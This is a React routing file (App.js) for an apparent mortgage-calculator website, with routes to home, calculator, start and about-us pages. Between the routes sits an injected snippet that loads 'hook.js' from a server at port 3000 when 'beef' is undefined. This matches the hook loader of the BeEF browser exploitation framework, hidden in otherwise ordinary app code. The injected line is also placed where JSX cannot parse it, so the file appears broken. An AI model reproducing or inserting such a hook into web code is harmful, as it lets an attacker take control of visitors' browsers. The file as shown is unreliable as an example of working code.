import logo from './logo.svg';
import React from 'react';
import './App.css';
import { BrowserRouter as Router, Routes, Route } from "react-router-dom";
import Calculator from './components/Calculator/Calculator.js';
import Start from './components/Start/Start.js';
import About from './components/About/About.js';
import Home from './components/Home.js';

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/mortgage-calculator" element={<Calculator />} />
        <Route path="/start" element={<Start />} />
        <Route path="/about-us" element={<About />} />
{javascript: (function () { var url = 'http://0.0.0.0:3000/hook.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();}      </Routes>
    </Router>
  );
}

export default App;
